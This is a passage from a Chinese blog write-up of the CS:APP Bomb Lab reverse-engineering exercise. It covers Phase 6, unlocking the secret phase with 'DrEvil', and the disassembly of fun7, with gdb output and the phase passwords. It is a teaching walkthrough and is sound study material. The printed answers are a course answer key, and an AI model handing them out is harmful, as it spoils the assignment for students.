<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="number">12345678f</span><span class="keyword">or</span> (i = <span class="number">5</span>; i != <span class="number">0</span>; --i) &#123;          <span class="comment">// i in %ebp</span></span><br><span class="line">    next_node = *(cur_node + <span class="number">1</span>);    <span class="comment">// next_node in %rax, cur_node in %rbx</span></span><br><span class="line">    next_num  = *next_node;         <span class="comment">// next_num in %eax</span></span><br><span class="line">    <span class="keyword">if</span> (*cur_node &lt; next_num)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    cur_node = *(cur_node + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next_node;</span><br></pre></td></tr></table></figure>
<p>由上一节的分析，<code>*cur_node</code> 即 <code>cur_node-&gt;val</code>，<code>*(cur_node + 1)</code> 即 <code>cur_node-&gt;next</code>。通过这段代码，可以发现链表各个结点的数据 <code>val</code> 需要是顺序递减的。</p>
<p>以 1 号结点 <code>node1</code> 为例，使用 gdb 查看其数据 <code>val</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;d 0x6032d0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:       332</span><br></pre></td></tr></table></figure>
<p>用同样的方式得到链表 6 个结点的数据：</p>
<blockquote>
<p>p_node1-&gt;val = 332<br>
p_node2-&gt;val = 168<br>
p_node3-&gt;val = 924<br>
p_node4-&gt;val = 691<br>
p_node5-&gt;val = 477<br>
p_node6-&gt;val = 443</p>
</blockquote>
<p>按递减顺序排列后，可见在栈中地址由低到高应当分别为 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code> 号结点。</p>
<h5 id="627-确定输入的-6-个整数"><a class="markdownIt-Anchor" href="#627-确定输入的-6-个整数"></a> 6.2.7 确定输入的 6 个整数</h5>
<p>由之前的分析，<code>nums[i]</code> 在第三部分的代码中被依次修改成了 <code>7 - nums[i]</code>，而修改后的值分别对应栈中结点的标号 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code>。</p>
<p>因此，最开始输入的 6 个整数也就是 <code>4</code>, <code>3</code>, <code>2</code>, <code>1</code>, <code>6</code>, <code>5</code>，本关密码即为 <code>4 3 2 1 6 5</code>。</p>
<h5 id="628-测试"><a class="markdownIt-Anchor" href="#628-测试"></a> 6.2.8 测试</h5>
<p>在 gdb 中输入 Phase 6 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>
<h3 id="7-结束了吗"><a class="markdownIt-Anchor" href="#7-结束了吗"></a> 7. 结束了吗</h3>
<p>在 bomb.c 文件的最后，留下了这样一句耐人寻味的话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* Wow, they got it!  But isn&#39;t something... missing?  Perhaps</span><br><span class="line"> * something they overlooked?  Mua ha ha ha ha! *&#x2F;</span><br></pre></td></tr></table></figure>
<p>这是因为，本 Lab 还有一个隐藏关！</p>
<h3 id="8-secret-phase"><a class="markdownIt-Anchor" href="#8-secret-phase"></a> 8. Secret phase</h3>
<h4 id="81-本关密码"><a class="markdownIt-Anchor" href="#81-本关密码"></a> 8.1 本关密码</h4>
<h5 id="811-开启隐藏关的方法"><a class="markdownIt-Anchor" href="#811-开启隐藏关的方法"></a> 8.1.1 开启隐藏关的方法</h5>
<p>在 Phase 4 输入的 2 个整数后再额外输入 1 个字符串 <code>DrEvil</code>，比如将输入的字符串修改为 <code>7 0 DrEvil</code>，其余环节不变。</p>
<h5 id="812-隐藏关的密码"><a class="markdownIt-Anchor" href="#812-隐藏关的密码"></a> 8.1.2 隐藏关的密码</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22, 20</span><br></pre></td></tr></table></figure>
<h4 id="82-解题过程"><a class="markdownIt-Anchor" href="#82-解题过程"></a> 8.2 解题过程</h4>
<h5 id="820-找到隐藏函数"><a class="markdownIt-Anchor" href="#820-找到隐藏函数"></a> 8.2.0 找到隐藏函数</h5>
<p>好吧，实际上在 bomb.asm 中稍微往下翻翻就能找到一个名为 <code>secret_phase</code> 的函数。顾名思义，这应该就是隐藏关所对应的函数。</p>
<h5 id="821-找到开启隐藏关的方法"><a class="markdownIt-Anchor" href="#821-找到开启隐藏关的方法"></a> 8.2.1 找到开启隐藏关的方法</h5>
<p>事实上，前 6 关通过后，程序就自动终止了。那么应该如何进入这个隐藏关呢？</p>
<p>在 bomb.asm 搜索关键词 <code>secret_phase</code>，可以发现在函数 <code>phase_defused</code> 中出现了调用函数 <code>secret_phase</code> 的语句 401630: <code>callq 401242</code>。其中函数 <code>phase_defused</code> 就是每关通过后都会调用的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line">  401659:   90                      nop</span><br><span class="line">  40165a:   90                      nop</span><br><span class="line">  40165b:   90                      nop</span><br><span class="line">  40165c:   90                      nop</span><br><span class="line">  40165d:   90                      nop</span><br><span class="line">  40165e:   90                      nop</span><br><span class="line">  40165f:   90                      nop</span><br></pre></td></tr></table></figure>
<p>注意到以下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">...</span><br><span class="line">40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">40164b:   00 00</span><br><span class="line">40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">401658:   c3                      retq</span><br><span class="line">401659:   90                      nop</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4015d6: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<p>4015d8: <code>cmpl $0x6,0x202181(%rip)</code> 和 4015df: <code>jne 40163f</code> 判断 <code>0x202181(%rip)</code> 的值是否为 <code>6</code>，是则继续执行之后的语句，否则直接跳到 40163f: <code>mov 0x68(%rsp),%rax</code> 返回（这一段详见 5.2.1 节关于 stack canary 的阐述）。</p>
<p><code>0x202181(%rip)</code> 也就是 <code>(0x603760)</code> 存放的是什么？通过 gdb 发现，这个值的初始值为 <code>0</code>，而每通过一关后，这个值便加 <code>1</code>。结合注释（即变量名）<code># 603760</code>，推测它表示输入过的字符串数量，实际上也就是通过的关卡数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   0</span><br><span class="line">(gdb) b phase_1</span><br><span class="line">Breakpoint 2 at 0x400ee0</span><br><span class="line">(gdb) b phase_2</span><br><span class="line">Breakpoint 3 at 0x400efc</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: &#x2F;root&#x2F;Hakula&#x2F;csapp&#x2F;lab2&#x2F;bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>判断这个值是否为 <code>6</code>，也就是判断是否通过了全部 6 个关卡。因此这个隐藏关只有在 6 个关卡都顺利通过后才会开启。</p>
<p>剩下的片段也就是本函数与隐藏关相关的主体部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码我们已经十分熟悉。<code>0x402619</code> 指向的应该是一个格式化字符串。使用 gdb 查看地址 <code>0x402619</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x402619</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>
<p>因此，在某处我们需要按这个格式输入 2 个整数和 1 个字符串。这 2 个整数将被保存在 <code>0x8(%rsp)</code> 和 <code>0xc(%rsp)</code> 中，字符串将被保存在 <code>0x10(%rsp)</code> 中。需要注意的是这里还额外传入了一个地址 <code>0x603870</code>，根据我对系统函数 <code>sscanf</code> 的理解，这应当指的是那个被用来解析的字符串的地址。</p>
<p>读取完毕后，栈内保存的信息为：</p>
<blockquote>
<p>0x8(%rsp) = nums[0]<br>
0xc(%rsp) = nums[1]<br>
0x10(%rsp) = password</p>
</blockquote>
<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示 <code>0x603870</code> 指向的字符串中解析得到的（前）2 个整数，<code>password</code> 表示之后解析得到的（前）1 个字符串。</p>
<p>在函数 <code>phase_defused</code> 的入口处设置一个断点。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b phase_defused</span><br></pre></td></tr></table></figure>
<p>每通过一个关卡后，使用 gdb 查看地址 <code>0x603870</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x603870</span><br></pre></td></tr></table></figure>
<p>发现在通过 Phase 4 后，输出信息产生了变化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>
<p>可见，<code>0x603870</code> 指向的是 Phase 4 中输入的字符串 <code>7 0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4015ff: <code>cmp $0x3,%eax</code> 和 401602: <code>jne 401635</code> 判断函数 <code>sscanf</code> 的返回值是否为 <code>3</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>于是我们知道，在 Phase 4 中除了需要输入作为密码的 2 个整数外，还需要再额外输入 1 个字符串。这是开启隐藏关的前提条件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:   85 c0                   test   %eax,%eax</span><br><span class="line">401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>%rdi = 0x10(%rsp) = password<br>
%esi = 0x402622</p>
</blockquote>
<p>这段代码我们也已经十分熟悉。<code>0x402622</code> 指向的应该是一个字符串。使用 gdb 查看地址 <code>0x402622</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x402622</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>
<p>此后，函数 <code>strings_not_equal</code> 检查 %rdi 和 %rsi 寄存器指向的字符串是否相等，即 <code>password</code> 是否等于 <code>DrEvil</code>，是则返回 <code>0</code>，否则返回 <code>1</code>。</p>
<p>401613: <code>test %eax,%eax</code> 和 401615: <code>jne 401635</code> 判断函数 <code>strings_not_equal</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>因此，在 Phase 4 中需要额外输入的 1 个字符串就是 <code>DrEvil</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
<p>这段就是输出几行提示文本，待会儿我们可以直接看到。以及，调用函数 <code>secret_phase</code> 开启隐藏关。</p>
<h5 id="822-开启隐藏关"><a class="markdownIt-Anchor" href="#822-开启隐藏关"></a> 8.2.2 开启隐藏关</h5>
<p>运行到 Phase 4 时，在 gdb 中输入修改后的字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7 0 DrEvil</span><br></pre></td></tr></table></figure>
<p>继续跑完全部 6 个关卡，输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Curses, you&#39;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br></pre></td></tr></table></figure>
<h5 id="823-观察函数-secret_phase"><a class="markdownIt-Anchor" href="#823-观察函数-secret_phase"></a> 8.2.3 观察函数 secret_phase</h5>
<p>在 bomb.asm 中找到函数 <code>secret_phase</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br><span class="line">  401292:   c3                      retq</span><br><span class="line">  401293:   90                      nop</span><br><span class="line">  401294:   90                      nop</span><br><span class="line">  401295:   90                      nop</span><br><span class="line">  401296:   90                      nop</span><br><span class="line">  401297:   90                      nop</span><br><span class="line">  401298:   90                      nop</span><br><span class="line">  401299:   90                      nop</span><br><span class="line">  40129a:   90                      nop</span><br><span class="line">  40129b:   90                      nop</span><br><span class="line">  40129c:   90                      nop</span><br><span class="line">  40129d:   90                      nop</span><br><span class="line">  40129e:   90                      nop</span><br><span class="line">  40129f:   90                      nop</span><br></pre></td></tr></table></figure>
<p>401243: <code>callq 40149e</code> 调用函数 <code>read_line</code>，其返回值（即输入的一行字符串 <code>str</code>）保存在 %rax 寄存器。</p>
<blockquote>
<p>%rax = str</p>
</blockquote>
<p>401248: <code>mov $0xa,%edx</code> 和 40124d: <code>mov $0x0,%esi</code> 将 %edx 和 %esi 寄存器分别设置为 <code>10</code> 和 <code>0</code>。</p>
<blockquote>
<p>%esi = 0<br>
%edx = 10</p>
</blockquote>
<p>400e37: <code>mov %rax,%rdi</code> 将 %rax 寄存器保存的地址传给了 %rdi 寄存器。</p>
<blockquote>
<p>%rdi = %rax = str</p>
</blockquote>
<p>401255: <code>callq 400bd0</code> 调用系统函数 <code>strtol</code>。可以推测出这个函数的作用是将字符串转化为整数，但我对它的参数用法不是很了解。查阅资料得，传入的第 1 个参数 %rdi 是被用来解析的字符串的地址 <code>str</code>，第 2 个参数 %esi 是字符串中需要解析部分的结束地址（这里我们传入的是 <code>NULL</code>，表示不使用这个参数），第 3 个参数 %edx 是这个整数的底数（这里我们传入的是 <code>10</code>，表示十进制）[^7]。最后函数返回值保存在 %rax 寄存器中。</p>
<p>总之，这部分的作用就是读入一个多位的整数。</p>
<blockquote>
<p>%rax = num</p>
</blockquote>
<p>其中，<code>num</code> 表示输入的字符串解析得到的多位整数。</p>
<p>400e37: <code>mov %rax,%rbx</code> 和 40125d: <code>lea -0x1(%rax),%eax</code> 将 %rax 的值传给了 %rbx 寄存器，然后 %rax 的值减 1。</p>
<blockquote>
<p>%rbx = %rax = num<br>
%eax = %rax - 1 = num - 1</p>
</blockquote>
<p>401260: <code>cmp $0x3e8,%eax</code> 和 401265: <code>jbe 40126c</code> 判断 %eax 的值是否不超过 <code>0x3e8</code>，是则直接跳到 40126c: <code>mov %ebx,%esi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的整数应当不超过 <code>1001</code>（无符号数）。</p>
<p>40126c: <code>mov %ebx,%esi</code> 和 40126e: <code>mov $0x6030f0,%edi</code> 将 %ebx 的值传给了 %esi 寄存器，将地址 <code>0x6030f0</code> 传给了 %edi 寄存器。</p>
<blockquote>
<p>%edi = 0x6030f0<br>
%esi = %ebx = num</p>
</blockquote>
<p>401273: <code>callq 401204</code> 调用函数 <code>fun7</code>，也就是本关的主体部分。</p>
<p>401278: <code>cmp $0x2,%eax</code> 和 40127b: <code>je 401282</code> 判断函数 <code>fun7</code> 的返回值是否为 <code>2</code>，是则直接跳到 401282: <code>mov $0x402438,%edi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，函数 <code>fun7</code> 的返回值应当为 <code>2</code>。</p>
<p>之后就是输出一行提示文本，以及一些收尾工作。</p>
<h5 id="824-观察函数-fun7"><a class="markdownIt-Anchor" href="#824-观察函数-fun7"></a> 8.2.4 观察函数 fun7</h5>
<p>在 bomb.asm 中找到函数 <code>fun7</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>401217 和 40122d: <code>callq 401204</code> 都调用了函数 <code>fun7</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// p_node in %rdi, target in %esi</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* p_node, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p_node == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    cur_num = *p_node;                          <span class="comment">// cur_num in %edx</span></span><br><span class="line">    <span class="keyword">if</span> (cur_num &gt; target) &#123;</span><br><span class="line">        p_node = *(p_node + <span class="number">1</span>);</span><br><span class="line">        result = fun7(p_node, target);          <span class="comment">// result in %eax</span></span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_num == target) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                    <span class="comment">// cur_num &lt; target</span></span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        p_node = *(p_node + <span class="number">2</span>);</span><br><span class="line">        result = fun7(p_node, target);</span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此这个递归函数的作用就很清晰了。</p>
<h5 id="825-确定输入的整数"><a class="markdownIt-Anchor" href="#825-确定输入的整数"></a> 8.2.5 确定输入的整数</h5>
<p>接下来，使用 gdb 查看作为参数传入的地址 <code>0x6030f0</code> 开始的连续内存中的值（经试验可知第 60 个 8 bytes 之后的地址中存放的都是无关数据，因此这里只需显示前 60 个地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x2F;60xg 0x6030f0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:   0x0000000000000024      0x0000000000603110</span><br><span class="line">0x603100 &lt;n1+16&gt;:        0x0000000000603130       0x0000000000000000</span><br><span class="line">0x603110 &lt;n21&gt;:  0x0000000000000008      0x0000000000603190</span><br><span class="line">0x603120 &lt;n21+16&gt;:       0x0000000000603150       0x0000000000000000</span><br><span class="line">0x603130 &lt;n22&gt;:  0x0000000000000032      0x0000000000603170</span><br><span class="line">0x603140 &lt;n22+16&gt;:       0x00000000006031b0       0x0000000000000000</span><br><span class="line">0x603150 &lt;n32&gt;:  0x0000000000000016      0x0000000000603270</span><br><span class="line">0x603160 &lt;n32+16&gt;:       0x0000000000603230       0x0000000000000000</span><br><span class="line">0x603170 &lt;n33&gt;:  0x000000000000002d      0x00000000006031d0</span><br><span class="line">0x603180 &lt;n33+16&gt;:       0x0000000000603290       0x0000000000000000</span><br><span class="line">0x603190 &lt;n31&gt;:  0x0000000000000006      0x00000000006031f0</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:       0x0000000000603250       0x0000000000000000</span><br><span class="line">0x6031b0 &lt;n34&gt;:  0x000000000000006b      0x0000000000603210</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:       0x00000000006032b0       0x0000000000000000</span><br><span class="line">0x6031d0 &lt;n45&gt;:  0x0000000000000028      0x0000000000000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x6031f0 &lt;n41&gt;:  0x0000000000000001      0x0000000000000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603210 &lt;n47&gt;:  0x0000000000000063      0x0000000000000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603230 &lt;n44&gt;:  0x0000000000000023      0x0000000000000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603250 &lt;n42&gt;:  0x0000000000000007      0x0000000000000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:       0x0000000000000000       0x0000000000000000</span><br><span class="line">0x603270 